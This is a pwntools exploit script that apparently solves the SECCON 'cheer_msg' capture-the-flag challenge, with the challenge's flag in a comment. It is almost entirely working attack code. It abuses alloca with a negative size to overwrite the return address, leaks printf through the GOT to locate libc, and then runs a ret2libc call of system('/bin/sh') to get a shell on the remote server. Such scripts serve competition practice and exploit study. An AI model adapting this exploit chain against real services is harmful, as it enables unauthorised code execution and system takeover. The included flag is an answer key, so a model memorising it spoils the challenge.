from pwn import *

# SECCON{N40.T_15_ju571c3}

binary = ELF('cheer_msg')
libc = ELF('libc-2.19.so-c4dc1270c1449536ab2efbbe7053231f1a776368')

#io = process('./cheer_msg')
io = remote('cheermsg.pwn.seccon.jp', 30527)

# alloca with negative size, move stack, and local buffer for
# name will be return address

io.sendline('-152')
io.recvuntil('Name >> ')

# rop chain to leak address printf, and return to _start
io.sendline(
    p32(binary.symbols['printf']) +
    p32(binary.entry) +
    p32(binary.got['printf'])
)

# negative size, input just skipped
io.recvuntil('Message : ')
io.recvline()

# read address
printf = u32(io.recvline()[:4])
libc_base = printf - libc.symbols['printf']

binsh = next(libc.search('/bin/sh\x00'))

print('printf at %.8x' % printf)
print('libc_base at %.8x' % libc_base)

io.sendline('-152')
io.recvuntil('Name >> ')

# ret2libc attack
io.sendline(
    p32(libc_base + libc.symbols['system']) +
    'AAAA' +
    p32(libc_base + binsh)
)

# shell!
io.interactive()
